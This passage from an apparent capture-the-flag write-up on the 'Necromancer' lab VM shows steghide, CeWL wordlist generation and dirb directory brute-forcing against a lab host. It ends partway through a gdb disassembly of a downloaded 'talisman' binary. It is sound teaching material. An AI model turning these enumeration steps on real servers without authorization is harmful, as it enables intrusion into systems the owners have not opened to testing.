DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, JFIF standard 1.01</span><br><span class="line">root@kali:~/ctf/necromancer# steghide info magicbook.jpg</span><br><span class="line">&quot;magicbook.jpg&quot;:</span><br><span class="line">  format: jpeg</span><br><span class="line">  capacity: 8.9 KB</span><br><span class="line">Try to get information about embedded data ? (y/n) y</span><br><span class="line">Enter passphrase:</span><br><span class="line">steghide: could not extract any data with that passphrase!</span><br></pre></td></tr></table></figure>
<p>No luck this time and the journey takes an involuntary break for a few days. Well rested we give it another try, knowing we might have to think out of the box. If the next flag is another web page, we might be able to crack is using <code>dirbuster</code>, although looking at the last directory we probably won’t get very far with the common wordlists. The text suggests that we need a magical item. A bit of research points me to CeWL which can generate custom wordlists from for example wikipedia. The closest thing wikipedia can provide is a list of mythological objects.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# man cewl</span><br><span class="line">root@kali:~/ctf/necromancer# cewl https://en.wikipedia.org/wiki/List_of_mythological_objects -d 0 &gt; wordlist.txt</span><br><span class="line">root@kali:~/ctf/necromancer# dirb http://10.0.2.10/ wordlist.txt -w</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sun Dec 17 20:06:17 2017</span><br><span class="line">URL_BASE: http://10.0.2.10/</span><br><span class="line">WORDLIST_FILES: wordlist.txt</span><br><span class="line">OPTION: Not Stopping on warning messages</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 6151</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://10.0.2.10/ ----</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sun Dec 17 20:06:22 2017</span><br><span class="line">DOWNLOADED: 6151 - FOUND: 0</span><br><span class="line"></span><br><span class="line">root@kali:~/ctf/necromancer# dirb http://10.0.2.10/amagicbridgeappearsatthechasm/ wordlist.txt -w</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sun Dec 17 20:07:03 2017</span><br><span class="line">URL_BASE: http://10.0.2.10/amagicbridgeappearsatthechasm/</span><br><span class="line">WORDLIST_FILES: wordlist.txt</span><br><span class="line">OPTION: Not Stopping on warning messages</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 6151</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://10.0.2.10/amagicbridgeappearsatthechasm/ ----</span><br><span class="line">+ http://10.0.2.10/amagicbridgeappearsatthechasm/talisman (CODE:200|SIZE:9676)</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sun Dec 17 20:07:16 2017</span><br><span class="line">DOWNLOADED: 6151 - FOUND: 1</span><br></pre></td></tr></table></figure>
<p>It turns out that the magical item is a talisman and the corresponding directory is not at base level but rather behind <code>amagicbridgeappearsatthechasm</code>. The URL prompts a file download, which is then inspected:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# file talisman</span><br><span class="line">talisman: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=2b131df906087adf163f8cba1967b3d2766e639d, not stripped</span><br><span class="line">root@kali:~/ctf/necromancer# chmod +x talisman</span><br></pre></td></tr></table></figure>
<p>We identify the file as a x32 ELF executable. Depending on the system one might need the 32-bit version of libc to execute it.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# ./talisman</span><br><span class="line">You have found a talisman.</span><br><span class="line"></span><br><span class="line">The talisman is cold to the touch, and has no words or symbols on it&apos;s surface.</span><br><span class="line"></span><br><span class="line">Do you want to wear the talisman?  Yes</span><br><span class="line"></span><br><span class="line">Nothing happens.</span><br></pre></td></tr></table></figure>
<p>No matter what I input, nothing happens. With <code>gdb</code>, however, we are in control:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/ctf/necromancer# gdb ./talisman</span><br><span class="line">GNU gdb (Debian 7.12-6+b1) 7.12.0.20161007-git</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</span><br><span class="line">and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</span><br><span class="line">Reading symbols from ./talisman...(no debugging symbols found)...done.</span><br><span class="line">(gdb) set disassembly-flavor intel</span><br><span class="line">(gdb) disassemble main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x08048a13 &lt;+0&gt;:	lea    ecx,[esp+0x4]</span><br><span class="line">   0x08048a17 &lt;+4&gt;:	and    esp,0xfffffff0</span><br><span class="line">   0x08048a1a &lt;+7&gt;:	push   DWORD PTR [ecx-0x4]</span><br><span class="line">   0x08048a1d &lt;+10&gt;:	push   ebp</span><br><span class="line">   0x08048a1e &lt;+11&gt;:	mov    ebp,esp</span><br><span class="line">   0x08048a20 &lt;+13&gt;:	push   ecx</span><br><span class="line">   0x08048a21 &lt;+14&gt;:	sub    esp,0x4</span><br><span class="line">   0x08048a24 &lt;+17&gt;:	call   0x8048529 &lt;wearTalisman&gt;</span><br><span class="line">   0x08048a29 &lt;+22&gt;:	mov    eax,0x0</span><br><span class="line">   0x08048a2e &lt;+27&gt;:	add    esp,0x4</span><br><span class="line">   0x08048a31 &lt;+30&gt;:	pop    ecx</span><br><span class="line">   0x08048a32 &lt;+31&gt;:	pop    ebp</span><br><span class="line">   0x08048a33 &lt;+32&gt;:	lea    esp,[ecx-0x4]</span><br><span class="line">   0x08048a36 &lt;+35&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line">(gdb) disassemble wearTalisman</span><br><span class="line">Dump of assembler code for function wearTalisman:</span><br><span class="line">   0x08048529 &lt;+0&gt;:	push   ebp</span><br><span class="line">   0x0804852a &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">   0x0804852c &lt;+3&gt;:	push   edi</span><br><span class="line">   0x0804852d &lt;+4&gt;:	sub    esp,0x1b4</span><br><span class="line">   0x08048533 &lt;+10&gt;:	lea    edx,[ebp-0x1ac]</span><br><span class="line">   0x08048539 &lt;+16&gt;:	mov    eax,0x0</span><br><span class="line">   0x0804853e &lt;+21&gt;:	mov    ecx,0x64</span><br><span class="line">   0x08048543 &lt;+26&gt;:	mov    edi,edx</span><br><span class="line">   0x08048545 &lt;+28&gt;:	rep stos DWORD PTR es:[edi],eax</span><br><span class="line">   0x08048547 &lt;+30&gt;:	mov    BYTE PTR [ebp-0x1ac],0xec</span><br><span class="line">   0x0804854e &lt;+37&gt;:	mov    BYTE PTR [ebp-0x1ab],0x9d</span><br><span class="line">   0x08048555 &lt;+44&gt;:	mov    BYTE PTR [ebp-0x1aa],0x49</span><br><span class="line">   0x0804855c &lt;+51&gt;:	mov    BYTE PTR [ebp-0x1a9],0x81</span><br><span class="line">   0x08048563 &lt;+58&gt;:	mov    BYTE PTR [ebp-0x1a8],0xdd</span><br><span class="line">   0x0804856a &lt;+65&gt;:	mov    BYTE PTR [ebp-0x1a7],0x93</span><br><span class="line">   0x08048571 &lt;+72&gt;:	mov    BYTE PTR [ebp-0x1a6],0x4a</span><br><span class="line">   0x08048578 &lt;+79&gt;:	mov    BYTE PTR [ebp-0x1a5],0xc4</span><br><span class="line">   0x0804857f &lt;+86&gt;:	mov    BYTE PTR [ebp-0x1a4],0x95</span><br><span class="line">   0x08048586 &lt;+93&gt;:	mov    BYTE PTR [ebp-0x1a3],0x94</span><br><span class="line">   0x0804858d &lt;+100&gt;:	mov    BYTE PTR [ebp-0x1a2],0x53</span><br><span class="line">   0x08048594 &lt;+107&gt;:	mov    BYTE PTR [ebp-0x1a1],0xd4</span><br><span class="line">   0x0804859b &lt;+114&gt;:	mov    BYTE PTR [ebp-0x1a0],0xdb</span><br><span class="line">   0x080485a2 &lt;+121&gt;:	mov    BYTE PTR [ebp-0x19f],0x96</span><br><span class="line">   0x080485a9 &lt;+128&gt;:	mov    BYTE PTR [ebp-0x19e],0x1c</span><br><span class="line">   0x080485b0 &lt;+135&gt;:	mov    BYTE PTR [ebp-0x19d],0xc0</span><br><span class="line">   0x080485b7 &lt;+142&gt;:	mov    BYTE PTR [ebp-0x19c],0x95</span><br><span class="line">   0x080485be &lt;+149&gt;:	mov    BYTE PTR [ebp-0x19b],0x86</span><br><span class="line">   0x080485c5 &lt;+156&gt;:	mov    BYTE PTR [ebp-0x19a],0x5d</span><br><span class="line">   0x080485cc &lt;+163&gt;:	mov    BYTE PTR [ebp-0x199],0xcd</span><br><span class="line">   0x080485d3 &lt;+170&gt;:	mov    BYTE PTR [ebp-0x198],0xdc</span><br><span class="line">   0x080485da &lt;+177&gt;:	mov    BYTE PTR [ebp-0x197],0x81</span><br><span class="line">   0x080485e1 &lt;+184&gt;:	mov    BYTE PTR [ebp-0x196],0x51</span><br><span class="line">   0x080485e8 &lt;+191&gt;:	mov    BYTE PTR [ebp-0x195],0xc0</span><br><span class="line">   0x080485ef &lt;+198&gt;:	mov    BYTE PTR [ebp-0x194],0xdb</span><br><span class="line">   0x080485f6 &lt;+205&gt;:	mov    BYTE PTR [ebp-0x193],0xdc</span><br><span class="line">   0x080485fd &lt;+212&gt;:	mov    BYTE PTR [ebp-0x192],0x36</span><br><span class="line">   0x08048604 &lt;+219&gt;:	mov    BYTE PTR [ebp-0x191],0xab</span><br><span class="line">   0x0804860b &lt;+226&gt;:	mov    BYTE PTR [ebp-0x190],0xb5</span><br><span class="line">   0x08048612 &lt;+233&gt;:	mov    BYTE PTR [ebp-0x148],0xe1</span><br><span class="line">   0x08048619 &lt;+240&gt;:	mov    BYTE PTR [ebp-0x147],0x9a</span><br><span class="line">   0x08048620 &lt;+247&gt;:	mov    BYTE PTR [ebp-0x146],0x59</span><br><span class="line">   0x08048627 &lt;+254&gt;:	mov    BYTE PTR [ebp-0x145],0x81</span><br><span class="line">   0x0804862e &lt;+261&gt;:	mov    BYTE PTR [ebp-0x144],0xc1</span><br><span class="line">   0x08048635 &lt;+268&gt;:	mov    BYTE PTR [ebp-0x143],0x93</span><br><span class="line">   0x0804863c &lt;+275&gt;:	mov    BYTE PTR [ebp-0x142],0x50</span><br><span class="line">   0x08048643 &lt;+282&gt;:	mov    BYTE PTR [ebp-0x141],0xc8</span><br><span class="line">   0x0804864a &lt;+289&gt;:	mov    BYTE PTR [ebp-0x140],0xc6</span><br><span class="line">   0x08048651 &lt;+296&gt;:	mov    BYTE PTR [ebp-0x13f],0x9f</span><br><span class="line">   0x08048658 &lt;+303&gt;:	mov    BYTE PTR [ebp-0x13e],0x5d</span><br><span class="line">   0x0804865f &lt;+310&gt;:	mov    BYTE PTR [ebp-0x13d],0xcf</span><br><span class="line">   0x08048666 &lt;+317&gt;:	mov    BYTE PTR [ebp-0x13c],0x95</span><br><span class="line">   0x0804866d &lt;+324&gt;:	mov    BYTE PTR [ebp-0x13b],0x9b</span><br><span class="line">   0x08048674 &lt;+331&gt;:	mov    BYTE PTR [ebp-0x13a],0x4f</span><br><span class="line">   0x0804867b &lt;+338&gt;:	mov    BYTE PTR [ebp-0x139],0x81</span><br><span class="line">   0x08048682 &lt;+345&gt;:	mov    BYTE PTR [ebp-0x138],0xd6</span><br><span class="line">   0x08048689 &lt;+352&gt;:	mov    BYTE PTR [ebp-0x137],0x9d</span><br><span class="line">   0x08048690 &lt;+359&gt;:	mov    BYTE PTR [ebp-0x136],0x50</span><br><span class="line">   0x08048697 &lt;+366&gt;:	mov    BYTE PTR [ebp-0x135],0xc5</span><br><span class="line">   0x0804869e &lt;+373&gt;:	mov    BYTE PTR [ebp-0x134],0x95</span><br><span class="line">   0x080486a5 &lt;+380&gt;:	mov    BYTE PTR [ebp-0x133],0x86</span><br><span class="line">   0x080486ac &lt;+387&gt;:	mov    BYTE PTR [ebp-0x132],0x53</span><br><span class="line">   0x080486b3 &lt;+394&gt;:	mov    BYTE PTR [ebp-0x131],0x81</span><br><span class="line">   0x080486ba &lt;+401&gt;:	mov    BYTE PTR [ebp-0x130],0xc1</span><br><span class="line">   0x080486c1 &lt;+408&gt;:	mov    BYTE PTR [ebp-0x12f],0x9a</span><br><span class="line">   0x080486c8 &lt;+415&gt;:	mov    BYTE PTR [ebp-0x12e],0x59</span><br><span class="line">   0x080486cf &lt;+422&gt;:	mov    BYTE PTR [ebp-0x12d],0x81</span><br><span class="line">   0x080486d6 &lt;+429&gt;:	mov    BYTE PTR [ebp-0x12c],0xc1</span><br><span class="line">   0x080486dd &lt;+436&gt;:	mov    BYTE PTR [ebp-0x12b],0x9d</span><br><span class="line">   0x080486e4 &lt;+443&gt;:	mov    BYTE PTR [ebp-0x12a],0x49</span><br><span class="line">   0x080486eb &lt;+450&gt;:	mov    BYTE PTR [ebp-0x129],0xc2</span><br><span class="line">   0x080486f2 &lt;+457&gt;:	mov    BYTE PTR [ebp-0x128],0xdd</span><br><span class="line">   0x080486f9 &lt;+464&gt;:	mov    BYTE PTR [ebp-0x127],0xde</span><br><span class="line">   0x08048700 &lt;+471&gt;:	mov    BYTE PTR [ebp-0x126],0x1c</span><br><span class="line">   0x08048707 &lt;+478&gt;:	mov    BYTE PTR [ebp-0x125],0xc0</span><br><span class="line">   0x0804870e &lt;+485&gt;:	mov    BYTE PTR [ebp-0x124],0xdb</span><br><span class="line">   0x08048715 &lt;+492&gt;:	mov    BYTE PTR [ebp-0x123],0x96</span><br><span class="line">   0x0804871c &lt;+499&gt;:	mov    BYTE PTR [ebp-0x122],0x1c</span><br><span class="line">   0x08048723 &lt;+506&gt;:	mov    BYTE PTR [ebp-0x121],0xc9</span><br><span class="line">   0x0804872a &lt;+513&gt;:	mov    BYTE PTR [ebp-0x120],0xd4</span><br><span class="line">   0x08048731 &lt;+520&gt;:	mov    BYTE PTR [ebp-0x11f],0x81</span><br><span class="line">   0x08048738 &lt;+527&gt;:	mov    BYTE PTR [ebp-0x11e],0x1c</span><br><span class="line">   0x0804873f &lt;+534&gt;:	mov    BYTE PTR [ebp-0x11d],0xcf</span><br><span class="line">   0x08048746 &lt;+541&gt;:	mov    BYTE PTR [ebp-0x11c],0xda</span><br><span class="line">   0x0804874d &lt;+548&gt;:	mov    BYTE PTR [ebp-0x11b],0xd2</span><br><span class="line">   0x08048754 &lt;+555&gt;:	mov    BYTE PTR [ebp-0x11a],0x4b</span><br><span class="line">   0x0804875b &lt;+562&gt;:	mov    BYTE PTR [ebp-0x119],0xce</span><br><span class="line">   0x08048762 &lt;+569&gt;:	mov    BYTE PTR [ebp-0x118],0xc7</span><br><span class="line">   0x08048769 &lt;+576&gt;:	mov    BYTE PTR [ebp-0x117],0x96</span><br><span class="line">   0x08048770 &lt;+583&gt;:	mov    BYTE PTR [ebp-0x116],0x4f</span><br><span class="line">   0x08048777 &lt;+590&gt;:	mov    BYTE PTR [ebp-0x115],0x81</span><br><span class="line">   0x0804877e &lt;+597&gt;:	mov    BYTE PTR [ebp-0x114],0xda</span><br><span class="line">   0x08048785 &lt;+604&gt;:	mov    BYTE PTR [ebp-0x113],0x80</span><br><span class="line">   0x0804878c &lt;+611&gt;:	mov    BYTE PTR [ebp-0x112],0x1c</span><br><span class="line">   0x08048793 &lt;+618&gt;:	mov    BYTE PTR [ebp-0x111],0xd2</span><br><span class="line">   0x0804879a &lt;+625&gt;:	mov    BYTE PTR [ebp-0x110],0xcc</span><br><span class="line">   0x080487a1 &lt;+632&gt;:	mov    BYTE PTR [ebp-0x10f],0x9f</span><br><span class="line">   0x080487a8 &lt;+639&gt;:	mov    BYTE PTR [ebp-0x10e],0x5e</span><br><span class="line">   0x080487af &lt;+646&gt;:	mov    BYTE PTR [ebp-0x10d],0xce</span><br><span class="line">   0x080487b6 &lt;+653&gt;:	mov    BYTE PTR [ebp-0x10c],0xd9</span><br><span class="line">   0x080487bd &lt;+660&gt;:	mov    BYTE PTR [ebp-0x10b],0x81</span><br><span class="line">   0x080487c4 &lt;+667&gt;:	mov    BYTE PTR [ebp-0x10a],0x1c</span><br><span class="line">   0x080487cb &lt;+674&gt;:	mov    BYTE PTR [ebp-0x109],0xce</span><br><span class="line">   0x080487d2 &lt;+681&gt;:	mov    BYTE PTR [ebp-0x108],0xdb</span><br><span class="line">   0x080487d9 &lt;+688&gt;:	mov    BYTE PTR [ebp-0x107],0xd2</span><br><span class="line">   0x080487e0 &lt;+695&gt;:	mov    BYTE PTR [ebp-0x106],0x55</span><br><span class="line">   0x080487e7 &lt;+702&gt;:	mov    BYTE PTR [ebp-0x105],0xd5</span><br><span class="line">   0x080487ee &lt;+709&gt;:	mov    BYTE PTR [ebp-0x104],0x92</span><br><span class="line">   0x080487f5 &lt;+716&gt;:	mov    BYTE PTR [ebp-0x103],0x81</span><br><span class="line">   0x080487fc &lt;+723&gt;:	mov    BYTE PTR [ebp-0x102],0x1c</span><br><span class="line">   0x08048803 &lt;+730&gt;:	mov    BYTE PTR [ebp-0x101],0xd2</span><br><span class="line">   0x0804880a &lt;+737&gt;:	mov    BYTE PTR [ebp-0x100],0xc0</span><br><span class="line">   0x08048811 &lt;+744&gt;:	mov    BYTE PTR [ebp-0xff],0x80</span><br><span class="line">   0x08048818 &lt;+751&gt;:	mov    BYTE PTR [ebp-0xfe],0x5a</span><br><span class="line">   0x0804881f &lt;+758&gt;:	mov    BYTE PTR [ebp-0xfd],0xc0</span><br><span class="line">   0x08048826 &lt;+765&gt;:	mov    BYTE PTR [ebp-0xfc],0xd6</span><br><span class="line">   0x0804882d &lt;+772&gt;:	mov    BYTE PTR [ebp-0xfb],0x97</span><br><span class="line">   0x08048834 &lt;+779&gt;:	mov    BYTE PTR [ebp-0xfa],0x12</span><br><span class="line">   0x0804883b &lt;+786&gt;:	mov    BYTE PTR [ebp-0xf9],0xab</span><br><span class="line">   0x08048842 &lt;+793&gt;:	mov    BYTE PTR [ebp-0xf8],0xbf</span><br><span class="line">   0x08048849 &lt;+800&gt;:	mov    BYTE PTR [ebp-0xf7],0xf2</span><br><span class="line">   0x08048850 &lt;+807&gt;:	mov    BYTE PTR [ebp-0xe4],0xf1</span><br><span class="line">   0x08048857 &lt;+814&gt;:	mov    BYTE PTR [ebp-0xe3],0x9d</span><br><span class="line">   0x0804885e &lt;+821&gt;:	mov    BYTE PTR [ebp-0xe2],0x1c</span><br><span class="line">   0x08048865 &lt;+828&gt;:	mov    BYTE PTR [ebp-0xe1],0xd8</span><br><span class="line">   0x0804886c &lt;+835&gt;:	mov    BYTE PTR [ebp-0xe0],0xda</span><br><span class="line">   0x08048873 &lt;+842&gt;:	mov    BYTE PTR [ebp-0xdf],0x87</span><br><span class="line">   0x0804887a &lt;+849&gt;:	mov    BYTE PTR [ebp-0xde],0x1c</span><br><span class="line">   0x08048881 &lt;+856&gt;:	mov    BYTE PTR [ebp-0xdd],0xd6</span><br><span class="line">   0x08048888 &lt;+863&gt;:	mov    BYTE PTR [ebp-0xdc],0xd4</span><br><span class="line">   0x0804888f &lt;+870&gt;:	mov    BYTE PTR [ebp-0xdb],0x9c</span><br><span class="line">   0x08048896 &lt;+877&gt;:	mov    BYTE PTR [ebp-0xda],0x48</span><br><span class="line">   0x0804889d &lt;+884&gt;:	mov    BYTE PTR [ebp-0xd9],0x81</span><br><span class="line">   0x080488a4 &lt;+891&gt;:	mov    BYTE PTR [ebp-0xd8],0xc1</span><br><span class="line">   0x080488ab &lt;+898&gt;:	mov    BYTE PTR [ebp-0xd7],0x9d</span><br><span class="line">   0x080488b2 &lt;+905&gt;:	mov    BYTE PTR [ebp-0xd6],0x1c</span><br><span class="line">   0x080488b9 &lt;+912&gt;:	mov    BYTE PTR [ebp-0xd5],0xd6</span><br><span class="line">   0x080488c0 &lt;+919&gt;:	mov    BYTE PTR [ebp-0xd4],0xd0</span><br><span class="line">   0x080488c7 &lt;+926&gt;:	mov    BYTE PTR [ebp-0xd3],0x93</span><br><span class="line">   0x080488ce &lt;+933&gt;:	mov    BYTE PTR [ebp-0xd2],0x4e</span><br><span class="line">   0x080488d5 &lt;+940&gt;:	mov    BYTE PTR [ebp-0xd1],0x81</span><br><span class="line">   0x080488dc &lt;+947&gt;:	mov    BYTE PTR [ebp-0xd0],0xc1</span><br><span class="line">   0x080488e3 &lt;+954&gt;:	mov    BYTE PTR [ebp-0xcf],0x9a</span><br><span class="line">   0x080488ea &lt;+961&gt;:	mov    BYTE PTR [ebp-0xce],0x59</span><br><span class="line">   0x080488f1 &lt;+968&gt;:	mov    BYTE PTR [ebp-0xcd],0x81</span><br><span class="line">   0x080488f8 &lt;+975&gt;:	mov    BYTE PTR [ebp-0xcc],0xc1</span><br><span class="line">   0x080488ff &lt;+982&gt;:	mov    BYTE PTR [ebp-0xcb],0x93</span><br><span class="line">   0x08048906 &lt;+989&gt;:	mov    BYTE PTR [ebp-0xca],0x50</span><br><span class="line">   0x0804890d &lt;+996&gt;:	mov    BYTE PTR [ebp-0xc9],0xc8</span><br><span 